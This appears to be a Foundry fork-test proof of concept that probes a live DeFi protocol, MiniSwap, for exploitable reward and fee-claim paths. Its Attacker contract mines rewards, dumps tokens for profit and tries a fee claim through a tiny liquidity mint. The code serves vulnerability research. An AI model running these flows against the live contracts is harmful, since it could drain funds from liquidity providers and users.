// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/interfaces.sol";
import "../src/Attacker.sol";

/// MiniSwap (Ethereum) — L2 Phase-2 fork PoC. Read-only; fork only.
contract MiniswapTest is Test {
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant MINI = 0x4D953cf077c0C95Ba090226E59A18FcF97db44EC;

    address constant FACTORY1 = 0x1E2C2102cf8EfCaAAf20fFe926469EC7cD0d0f6E;
    address constant FACTORY2 = 0x2294577031F113DF4782B881cF0b140e94209a6F;
    address constant MINER1 = 0xcDD8DEC17622468A1775D18BB4FcFe8BE8Ba8b68;

    address constant P_WETH_USDT = 0xbBDf7D806a54fe1f563A3De662543afce613d0a4; // token0=WETH token1=USDT
    address constant P_MINI_USDT = 0x2da3c570EB567Db1945Ac119103978f28F6ea803; // token0=MINI token1=USDT
    address constant P_MINI_WETH = 0x716cD233093ab1C4CFf6eeCe779167d7edFfD1AC; // token0=MINI token1=WETH

    address constant P1_MINI_WETH = 0x1ab68044EE92122736CfE699ecb669B61446dBD3;
    address constant P1_YFI_WETH = 0xE2ca82f662fD7eAdEC92541af83456BaE88dc166;

    Attacker attacker;
    uint256 forkBlock;

    function setUp() public {
        forkBlock = vm.createSelectFork(
            vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")))
        );
        attacker = new Attacker();
    }

    function _res(address pair) internal view returns (uint112 r0, uint112 r1) {
        (r0, r1, ) = IMiniswapV1Pair(pair).getReserves();
    }
    function _resV2(address pair) internal view returns (uint112 r0, uint112 r1) {
        (r0, r1, ) = IMiniswapV2Pair(pair).getReserves();
    }
    function _out(uint256 amountIn, uint256 rIn, uint256 rOut) internal pure returns (uint256) {
        return (amountIn * 997 * rOut) / (rIn * 1000 + amountIn * 997);
    }

    // ---------- 00 state sanity ----------
    function test_00_state_sanity() public {
        emit log_named_uint("fork block", forkBlock);
        emit log_named_uint("MINI totalSupply", IMini(MINI).totalSupply());
        (uint112 rw, uint112 ru) = _res(P_WETH_USDT);
        emit log_named_uint("WETH/USDT pair WETH (wei)", rw);
        emit log_named_uint("WETH/USDT pair USDT (wei)", ru);
        emit log_named_uint("ETH price (USDT 1e18)", (uint256(ru) * 1e18) / uint256(rw));
        (uint112 rm, uint112 rwm) = _res(P_MINI_WETH);
        emit log_named_uint("MINI/WETH pair MINI", rm);
        emit log_named_uint("MINI/WETH pair WETH", rwm);
        emit log_named_uint("MINI price (wei WETH per MINI 1e18)", (uint256(rwm) * 1e18) / uint256(rm));
        assertTrue(IMiniswapMiner(MINER1).whitelistMap(P_WETH_USDT), "WETH/USDT whitelisted");
        assertTrue(IMiniswapMiner(MINER1).whitelistMap(P_MINI_WETH), "MINI/WETH whitelisted");
        assertEq(IMiniswapV1Pair(P_WETH_USDT).miner(), MINER1, "miner wired");
        assertFalse(IMini(MINI).paused(), "MINI not paused");
    }

    // ---------- 01 mining reward to a fresh unprivileged swapper ----------
    function test_01_mining_reward_fresh_attacker() public {
        uint256 spend = 50e6; // 50 USDT
        deal(USDT, address(attacker), spend);
        (uint112 rw, uint112 ru) = _res(P_WETH_USDT);
        uint256 wethOut = _out(spend, uint256(ru), uint256(rw));

        attacker.swapV1(P_WETH_USDT, USDT, spend, wethOut, 0);

        uint256 miniGained = IERC20(MINI).balanceOf(address(attacker));
        uint256 wethGained = IERC20(WETH).balanceOf(address(attacker));
        uint256 usdtLeft = IERC20(USDT).balanceOf(address(attacker));
        emit log_named_uint("USDT spent", spend - usdtLeft);
        emit log_named_uint("WETH gained", wethGained);
        emit log_named_uint("MINI mined (free)", miniGained);

        assertEq(usdtLeft, 0, "spent all");
        assertGt(wethGained, 0, "swap output received");
        assertGt(miniGained, 0, "MINI mining reward received by fresh swapper");
    }

    // ---------- 02 full cycle: mine MINI, dump into MINI/WETH, value the result ----------
    function test_02_mine_and_dump_realized() public {
        uint256 spend = 50e6;
        deal(USDT, address(attacker), spend);
        (uint112 rw, uint112 ru) = _res(P_WETH_USDT);
        uint256 wethOut = _out(spend, uint256(ru), uint256(rw));
        attacker.swapV1(P_WETH_USDT, USDT, spend, wethOut, 0);

        uint256 miniBal = IERC20(MINI).balanceOf(address(attacker));
        emit log_named_uint("MINI mined (1st swap)", miniBal);

        // dump MINI -> WETH on the whitelisted MINI/WETH V1 pair
        (uint112 rm, uint112 rwm) = _res(P_MINI_WETH);
        uint256 wethBack = _out(miniBal, uint256(rm), uint256(rwm));
        attacker.swapV1(P_MINI_WETH, MINI, miniBal, 0, wethBack); // token0=MINI in, token1=WETH out
        emit log_named_uint("wethBack est", wethBack);

        uint256 wethFinal = IERC20(WETH).balanceOf(address(attacker));
        uint256 usdtFinal = IERC20(USDT).balanceOf(address(attacker));
        uint256 miniFinal = IERC20(MINI).balanceOf(address(attacker));
        emit log_named_uint("final WETH", wethFinal);
        emit log_named_uint("final USDT", usdtFinal);
        emit log_named_uint("final MINI", miniFinal);

        (uint112 rw2, uint112 ru2) = _res(P_WETH_USDT);
        uint256 ethPrice = (uint256(ru2) * 1e18) / uint256(rw2);
        uint256 valueUsdt = (wethFinal * ethPrice) / 1e18 + usdtFinal;
        emit log_named_uint("final value in USDT (6dp)", valueUsdt);
        emit log_named_int("net profit vs 50 USDT (6dp)", int256(valueUsdt) - int256(spend));
    }

    // ---------- 03 daily issuance cap accounting ----------
    function test_03_daily_cap_accounting() public {
        uint256 base = (block.number - 10804094) / 6000;
        uint256 day = base;
        for (uint256 d = base - 1; d <= base + 1; d++) {
            if (IMiniswapMiner(MINER1).mineInfo(d) > IMiniswapMiner(MINER1).mineInfo(day)) day = d;
        }
        uint256 usedBefore = IMiniswapMiner(MINER1).mineInfo(day);
        emit log_named_uint("durationDay", day);
        emit log_named_uint("mineInfo[day] before", usedBefore);

        uint256 spend = 20e6;
        deal(USDT, address(attacker), spend);
        (uint112 rw, uint112 ru) = _res(P_WETH_USDT);
        uint256 wethOut = _out(spend, uint256(ru), uint256(rw));
        attacker.swapV1(P_WETH_USDT, USDT, spend, wethOut, 0);

        uint256 usedAfter = IMiniswapMiner(MINER1).mineInfo(day);
        emit log_named_uint("mineInfo[day] after", usedAfter);
        emit log_named_uint("delta (2x issued)", usedAfter - usedBefore);
        emit log_named_uint("daily limit", 18000e18);
        emit log_named_uint("remaining today", 18000e18 > usedAfter ? 18000e18 - usedAfter : 0);
        assertGe(usedAfter, usedBefore, "monotonic");
    }

    // ---------- 04 feeTemp / claim paths ----------
    function test_04_feetemp_claim_paths() public {
        address ftWethUsdt = IMiniswapV1Pair(P_WETH_USDT).feeTemp();
        address ftMiniWeth = IMiniswapV1Pair(P_MINI_WETH).feeTemp();
        emit log_named_address("feeTemp(WETH/USDT)", ftWethUsdt);
        emit log_named_uint("feeTemp(WETH/USDT) MINI", IERC20(MINI).balanceOf(ftWethUsdt));
        emit log_named_address("feeTemp(MINI/WETH)", ftMiniWeth);
        emit log_named_uint("feeTemp(MINI/WETH) MINI", IERC20(MINI).balanceOf(ftMiniWeth));

        uint256 bal = IERC20(MINI).balanceOf(ftWethUsdt);
        (bool ok, ) = ftWethUsdt.call(abi.encodeWithSelector(bytes4(0xe1a2f315), MINI, address(attacker), bal));
        emit log_named_string("sendTokenTo from stranger", ok ? "SUCCEEDED" : "reverted");
        assertFalse(ok, "stranger cannot move feeTemp tokens");

        emit log_named_uint("getMineFeeAmount(attacker)", IMiniswapV1Pair(P_WETH_USDT).getMineFeeAmount(address(attacker)));
        emit log_named_uint("userInFeeAmount(attacker)", IMiniswapV1Pair(P_WETH_USDT).userInFeeAmount(address(attacker)));
        emit log_named_uint("totalFeeAmount(WETH/USDT)", IMiniswapV1Pair(P_WETH_USDT).totalFeeAmount());
    }

    // ---------- 05 LP burn path on V1 pair ----------
    function test_05_lp_burn_receives_mini() public {
        (uint112 rm, uint112 rwm) = _res(P_MINI_WETH);
        uint256 addMini = 100e18;
        uint256 addWeth = (addMini * uint256(rwm)) / uint256(rm) + 1;
        deal(MINI, address(attacker), addMini);
        vm.deal(address(attacker), addWeth + 1 ether);
        vm.startPrank(address(attacker));
        IWETH(WETH).deposit{value: addWeth}();
        IERC20(MINI).transfer(P_MINI_WETH, addMini);
        IERC20(WETH).transfer(P_MINI_WETH, addWeth);
        uint256 lp = IMiniswapV1Pair(P_MINI_WETH).mint(address(attacker));
        emit log_named_uint("userInFeeAmount after mint", IMiniswapV1Pair(P_MINI_WETH).userInFeeAmount(address(attacker)));
        IERC20(P_MINI_WETH).transfer(P_MINI_WETH, lp);
        uint256 miniBefore = IERC20(MINI).balanceOf(address(attacker));
        (uint256 a0, uint256 a1, uint256 amini) = IMiniswapV1Pair(P_MINI_WETH).burn(address(attacker));
        vm.stopPrank();
        emit log_named_uint("userInFeeAmount after burn", IMiniswapV1Pair(P_MINI_WETH).userInFeeAmount(address(attacker)));
        emit log_named_uint("LP minted", lp);
        emit log_named_uint("burn amount0 (MINI)", a0);
        emit log_named_uint("burn amount1 (WETH)", a1);
        emit log_named_uint("burn amountMINI (fee share)", amini);
        emit log_named_uint("MINI delta", IERC20(MINI).balanceOf(address(attacker)) - miniBefore);
    }

    // ---------- 06 factory1: no mining hook, no excess, round trip loses fees ----------
    function test_06_factory1_no_mining_no_excess() public {
        (uint112 r0, uint112 r1) = _resV2(P1_MINI_WETH); // token0=MINI token1=WETH
        uint256 b0 = IERC20(MINI).balanceOf(P1_MINI_WETH);
        uint256 b1 = IERC20(WETH).balanceOf(P1_MINI_WETH);
        emit log_named_uint("factory1 MINI/WETH excess0", b0 > r0 ? b0 - r0 : 0);
        emit log_named_uint("factory1 MINI/WETH excess1", b1 > r1 ? b1 - r1 : 0);

        uint256 spend = 0.05 ether;
        vm.deal(address(attacker), spend + 1 ether);
        vm.startPrank(address(attacker));
        IWETH(WETH).deposit{value: spend}();
        vm.stopPrank();
        uint256 miniOut = _out(spend, uint256(r1), uint256(r0));
        attacker.swapV2(P1_MINI_WETH, WETH, spend, miniOut, 0);
        uint256 miniAfter = IERC20(MINI).balanceOf(address(attacker));
        emit log_named_uint("factory1 swap MINI out", miniOut);
        emit log_named_uint("factory1 MINI balance (should equal out, no reward)", miniAfter);
        assertEq(miniAfter, miniOut, "no extra MINI on factory1 (no mining hook)");

        // round trip back
        uint256 wethBack = _out(miniOut, uint256(r0) - miniOut, uint256(r1) + spend);
        attacker.swapV2(P1_MINI_WETH, MINI, miniOut, 0, wethBack);
        uint256 wethFinal = IERC20(WETH).balanceOf(address(attacker));
        emit log_named_uint("round trip WETH back", wethBack);
        emit log_named_uint("WETH final", wethFinal);
        assertLt(wethBack, spend, "round trip loses fees");
    }

    // ---------- 08 getMineFeeAmount: is it actually a distribution path? ----------
    function test_08_getMineFeeAmount_probe() public {
        address ft = IMiniswapV1Pair(P_WETH_USDT).feeTemp();
        uint256 ftBefore = IERC20(MINI).balanceOf(ft);
        uint256 attBefore = IERC20(MINI).balanceOf(address(attacker));

        // fresh attacker swaps first (may credit userInFeeAmount)
        uint256 spend = 100e6;
        deal(USDT, address(attacker), spend);
        (uint112 rw, uint112 ru) = _res(P_WETH_USDT);
        uint256 wethOut = _out(spend, uint256(ru), uint256(rw));
        attacker.swapV1(P_WETH_USDT, USDT, spend, wethOut, 0);
        emit log_named_uint("userInFeeAmount after swap", IMiniswapV1Pair(P_WETH_USDT).userInFeeAmount(address(attacker)));
        emit log_named_uint("getMineFeeAmount after swap", IMiniswapV1Pair(P_WETH_USDT).getMineFeeAmount(address(attacker)));

        // now call it as a state-changing function via low-level call
        (bool ok, bytes memory ret) = P_WETH_USDT.call(abi.encodeWithSelector(bytes4(0x8d7cf63a), address(attacker)));
        emit log_named_string("low-level getMineFeeAmount call ok", ok ? "YES" : "NO");
        if (ok && ret.length >= 32) emit log_named_uint("returned", abi.decode(ret, (uint256)));

        emit log_named_uint("feeTemp MINI before", ftBefore);
        emit log_named_uint("feeTemp MINI after", IERC20(MINI).balanceOf(ft));
        emit log_named_uint("attacker MINI before", attBefore);
        emit log_named_uint("attacker MINI after", IERC20(MINI).balanceOf(address(attacker)));

        // also try the pair's feeTemp->sendTokenTo path indirectly: does the pair expose a public sweep?
        (bool ok2, ) = P_WETH_USDT.call(abi.encodeWithSelector(bytes4(0xe1a2f315), MINI, address(attacker), ftBefore));
        emit log_named_string("pair.sendTokenTo selector on pair", ok2 ? "YES" : "NO");
    }

    // ---------- 09 THE CLAIM PATH: tiny LP mint -> userInFeeAmount = totalFeeAmount -> getMineFeeAmount pays out ----------
    function test_09_feetemp_claim_via_mint() public {
        address pair = P_WETH_USDT; // token0=WETH token1=USDT
        address ft = IMiniswapV1Pair(pair).feeTemp();
        uint256 ftBefore = IERC20(MINI).balanceOf(ft);
        uint256 totalFee = IMiniswapV1Pair(pair).totalFeeAmount();
        emit log_named_uint("feeTemp MINI before", ftBefore);
        emit log_named_uint("totalFeeAmount", totalFee);

        (uint112 rw, uint112 ru) = _res(pair);
        // tiny liquidity add: 2 USDT + proportional WETH
        uint256 addUsdt = 2e6;
        uint256 addWeth = (addUsdt * uint256(rw)) / uint256(ru) + 1;
        deal(USDT, address(attacker), addUsdt);
        deal(WETH, address(attacker), addWeth);
        emit log_named_uint("addWeth", addWeth);

        uint256 lp = attacker.mintV1(pair, WETH, USDT, addWeth, addUsdt);
        emit log_named_uint("LP minted", lp);
        emit log_named_uint("userInFeeAmount(attacker) after mint", IMiniswapV1Pair(pair).userInFeeAmount(address(attacker)));

        uint256 miniBefore = IERC20(MINI).balanceOf(address(attacker));
        (bool ok, bytes memory ret) = attacker.callGetMineFee(pair, address(attacker));
        emit log_named_string("getMineFeeAmount call ok", ok ? "YES" : "NO");
        if (ok && ret.length >= 32) emit log_named_uint("getMineFeeAmount returned", abi.decode(ret, (uint256)));
        uint256 miniAfter = IERC20(MINI).balanceOf(address(attacker));
        emit log_named_uint("attacker MINI delta", miniAfter - miniBefore);
        emit log_named_uint("feeTemp MINI after", IERC20(MINI).balanceOf(ft));
        emit log_named_uint("userInFeeAmount after claim", IMiniswapV1Pair(pair).userInFeeAmount(address(attacker)));
    }

    // ---------- 10 fee accrual claim: mint -> swap -> claim delta ----------
    function test_10_fee_claim_after_swap() public {
        address pair = P_WETH_USDT;
        address ft = IMiniswapV1Pair(pair).feeTemp();
        (uint112 rw, uint112 ru) = _res(pair);
        uint256 addUsdt = 2e6;
        uint256 addWeth = (addUsdt * uint256(rw)) / uint256(ru) + 1;
        deal(USDT, address(attacker), addUsdt + 200e6);
        deal(WETH, address(attacker), addWeth);
        uint256 lp = attacker.mintV1(pair, WETH, USDT, addWeth, addUsdt);
        uint256 snap = IMiniswapV1Pair(pair).userInFeeAmount(address(attacker));
        emit log_named_uint("LP minted", lp);
        emit log_named_uint("snapshot", snap);
        emit log_named_uint("totalFeeAmount at mint", IMiniswapV1Pair(pair).totalFeeAmount());

        // do a swap so fees accrue
        (uint112 rw2, uint112 ru2) = _res(pair);
        uint256 spend = 200e6;
        uint256 wethOut = _out(spend, uint256(ru2), uint256(rw2));
        attacker.swapV1(pair, USDT, spend, wethOut, 0);
        emit log_named_uint("totalFeeAmount after swap", IMiniswapV1Pair(pair).totalFeeAmount());
        emit log_named_uint("getMineFeeAmount (view)", IMiniswapV1Pair(pair).getMineFeeAmount(address(attacker)));

        uint256 ftBefore = IERC20(MINI).balanceOf(ft);
        uint256 miniBefore = IERC20(MINI).balanceOf(address(attacker));
        (bool ok, bytes memory ret) = attacker.callGetMineFee(pair, address(attacker));
        emit log_named_string("claim call ok", ok ? "YES" : "NO");
        if (ok && ret.length >= 32) emit log_named_uint("claim returned", abi.decode(ret, (uint256)));
        emit log_named_uint("attacker MINI delta", IERC20(MINI).balanceOf(address(attacker)) - miniBefore);
        emit log_named_uint("feeTemp MINI delta", IERC20(MINI).balanceOf(ft) - ftBefore);

        // now burn the LP and see the amountMINI (transfer must come from the LP owner = attacker)
        (bool okT, ) = address(attacker).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, pair, lp));
        emit log_named_string("LP transfer to pair ok", okT ? "YES" : "NO");
        if (okT) {
            (uint256 a0, uint256 a1, uint256 amini) = IMiniswapV1Pair(pair).burn(address(attacker));
            emit log_named_uint("burn amountMINI", amini);
            emit log_named_uint("burn MINI", a0);
            emit log_named_uint("burn WETH", a1);
        }
    }

    // ---------- 11 LP transfer after fee accrual: size dependence ----------
    function test_11_lp_transfer_after_fees() public {
        address pair = P_WETH_USDT;
        (uint112 rw, uint112 ru) = _res(pair);
        // larger position: 500 USDT worth
        uint256 addUsdt = 500e6;
        uint256 addWeth = (addUsdt * uint256(rw)) / uint256(ru) + 1;
        deal(USDT, address(attacker), addUsdt + 1000e6);
        deal(WETH, address(attacker), addWeth);
        uint256 lp = attacker.mintV1(pair, WETH, USDT, addWeth, addUsdt);
        emit log_named_uint("LP minted (500 USDT position)", lp);
        emit log_named_uint("pair totalSupply", IMiniswapV1Pair(pair).totalSupply());

        // accrue fees with a swap
        (uint112 rw2, uint112 ru2) = _res(pair);
        uint256 spend = 500e6;
        uint256 wethOut = _out(spend, uint256(ru2), uint256(rw2));
        attacker.swapV1(pair, USDT, spend, wethOut, 0);
        emit log_named_uint("getMineFeeAmount after swap", IMiniswapV1Pair(pair).getMineFeeAmount(address(attacker)));

        // try transferring a small part of the LP
        uint256 part = lp / 1000;
        (bool ok1, ) = address(attacker).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, address(0xBEEF), part)
        );
        emit log_named_string("LP partial transfer ok", ok1 ? "YES" : "NO");

        // try transferring the whole remaining LP to the pair for burn
        uint256 remaining = lp - part;
        (bool ok2, ) = address(attacker).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, pair, remaining)
        );
        emit log_named_string("LP full transfer to pair ok", ok2 ? "YES" : "NO");

        // try burning if the transfer succeeded
        if (ok2) {
            (uint256 a0, uint256 a1, uint256 amini) = IMiniswapV1Pair(pair).burn(address(attacker));
            emit log_named_uint("burn amount0", a0);
            emit log_named_uint("burn amount1", a1);
            emit log_named_uint("burn amountMINI (fee share)", amini);
        }
    }

    // ---------- 12 two-LP fee accounting: does A's burn break B's burn? ----------
    function test_12_two_lp_fee_accounting() public {
        address pair = P_WETH_USDT;
        Attacker b = new Attacker();
        (uint112 rw, uint112 ru) = _res(pair);
        uint256 addUsdt = 500e6;
        uint256 addWeth = (addUsdt * uint256(rw)) / uint256(ru) + 1;
        deal(USDT, address(attacker), addUsdt);
        deal(WETH, address(attacker), addWeth);
        deal(USDT, address(b), addUsdt);
        deal(WETH, address(b), addWeth);
        uint256 lpA = attacker.mintV1(pair, WETH, USDT, addWeth, addUsdt);
        uint256 lpB = b.mintV1(pair, WETH, USDT, addWeth, addUsdt);
        emit log_named_uint("lpA", lpA);
        emit log_named_uint("lpB", lpB);

        // accrue fees
        deal(USDT, address(attacker), 500e6);
        (uint112 rw2, uint112 ru2) = _res(pair);
        uint256 wethOut = _out(500e6, uint256(ru2), uint256(rw2));
        attacker.swapV1(pair, USDT, 500e6, wethOut, 0);
        emit log_named_uint("totalFeeAmount after swap", IMiniswapV1Pair(pair).totalFeeAmount());

        // A burns first
        (bool okA, ) = address(attacker).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, pair, lpA));
        if (okA) {
            (uint256 a0, uint256 a1, uint256 amini) = IMiniswapV1Pair(pair).burn(address(attacker));
            emit log_named_uint("A burn amountMINI", amini);
            emit log_named_uint("A burn WETH", a0);
            emit log_named_uint("A burn USDT", a1);
        } else {
            emit log("A LP transfer failed");
        }
        emit log_named_uint("totalFeeAmount after A burn", IMiniswapV1Pair(pair).totalFeeAmount());
        emit log_named_uint("userInFeeAmount(A) after", IMiniswapV1Pair(pair).userInFeeAmount(address(attacker)));
        emit log_named_uint("userInFeeAmount(B) after", IMiniswapV1Pair(pair).userInFeeAmount(address(b)));

        // B burns second
        (bool okB, ) = address(b).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, pair, lpB));
        emit log_named_string("B LP transfer ok", okB ? "YES" : "NO");
        if (okB) {
            (bool okB2, bytes memory rB2) = pair.call(abi.encodeWithSelector(bytes4(0x89afcb44), address(b)));
            emit log_named_string("B burn ok", okB2 ? "YES" : "NO");
            if (!okB2) emit log_named_bytes("B burn revert data", rB2);
        }
    }

    // ---------- 13 does the fee claim travel with the LP on transfer? ----------
    function test_13_fee_snapshot_on_transfer() public {
        address pair = P_WETH_USDT;
        Attacker b = new Attacker();
        (uint112 rw, uint112 ru) = _res(pair);
        uint256 addUsdt = 500e6;
        uint256 addWeth = (addUsdt * uint256(rw)) / uint256(ru) + 1;
        deal(USDT, address(attacker), addUsdt + 500e6);
        deal(WETH, address(attacker), addWeth);
        uint256 lpA = attacker.mintV1(pair, WETH, USDT, addWeth, addUsdt);
        emit log_named_uint("A snapshot at mint", IMiniswapV1Pair(pair).userInFeeAmount(address(attacker)));

        // accrue fees
        (uint112 rw2, uint112 ru2) = _res(pair);
        uint256 wethOut = _out(500e6, uint256(ru2), uint256(rw2));
        attacker.swapV1(pair, USDT, 500e6, wethOut, 0);
        emit log_named_uint("totalFeeAmount after swap", IMiniswapV1Pair(pair).totalFeeAmount());
        emit log_named_uint("A snapshot after swap", IMiniswapV1Pair(pair).userInFeeAmount(address(attacker)));

        // transfer the whole LP to B
        (bool ok, ) = address(attacker).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, address(b), lpA));
        emit log_named_string("A->B LP transfer ok", ok ? "YES" : "NO");
        emit log_named_uint("A snapshot after transfer", IMiniswapV1Pair(pair).userInFeeAmount(address(attacker)));
        emit log_named_uint("B snapshot after transfer", IMiniswapV1Pair(pair).userInFeeAmount(address(b)));

        // B burns
        (bool okB, ) = address(b).call(
            abi.encodeWithSelector(Attacker.transferToken.selector, pair, pair, lpA));
        emit log_named_string("B LP->pair ok", okB ? "YES" : "NO");
        if (okB) {
            (bool okB2, bytes memory rB) = pair.call(abi.encodeWithSelector(bytes4(0x89afcb44), address(b)));
            emit log_named_string("B burn ok", okB2 ? "YES" : "NO");
            if (okB2 && rB.length >= 96) {
                (uint256 b0, uint256 b1, uint256 bmini) = abi.decode(rB, (uint256, uint256, uint256));
                emit log_named_uint("B burn amount0", b0);
                emit log_named_uint("B burn amount1", b1);
                emit log_named_uint("B burn amountMINI", bmini);
            }
        }
    }

    // ---------- 07 stale-price round trip on factory1 YFI/WETH (always loses fees) ----------
    function test_07_stale_price_arb_marginal() public {
        (uint112 ry, uint112 rw) = _resV2(P1_YFI_WETH); // token0=YFI token1=WETH
        emit log_named_uint("YFI reserve", ry);
        emit log_named_uint("WETH reserve", rw);
        uint256[6] memory fracs = [uint256(1), 5, 10, 25, 50, 100];
        for (uint256 i = 0; i < fracs.length; i++) {
            uint256 din = (uint256(rw) * fracs[i]) / 100;
            if (din == 0) continue;
            uint256 yifOut = _out(din, uint256(rw), uint256(ry));
            uint256 wethBack = _out(yifOut, uint256(ry) - yifOut, uint256(rw) + din);
            emit log_named_uint("frac %", fracs[i]);
            emit log_named_uint("  weth in", din);
            emit log_named_uint("  weth back same pool", wethBack);
        }
    }
}
